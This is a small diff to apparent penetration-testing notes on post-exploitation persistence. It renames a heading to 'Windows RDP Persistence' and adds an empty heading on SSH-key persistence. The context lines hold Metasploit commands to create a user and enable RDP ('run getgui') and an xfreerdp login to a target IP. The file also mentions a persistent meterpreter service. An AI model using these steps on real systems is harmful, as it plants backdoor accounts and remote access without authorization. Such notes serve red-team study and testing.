@@ -17,7 +17,9 @@ This will create a persistant service that is paired with meterpreter payload
 4. run
 You should immediately receive a meterpreter session
 
-# Windows Persistence
+# Windows RDP Persistence
 1. Enable RDP using Metasploit module  OR
 2. Create user and enable RDP-- ```run getgui -e -u (username) -p (password)```
 3. login -- ```xfreerdp /u:username /p:password /v:(target IP)```
+
+# Persistence Va SSH keys
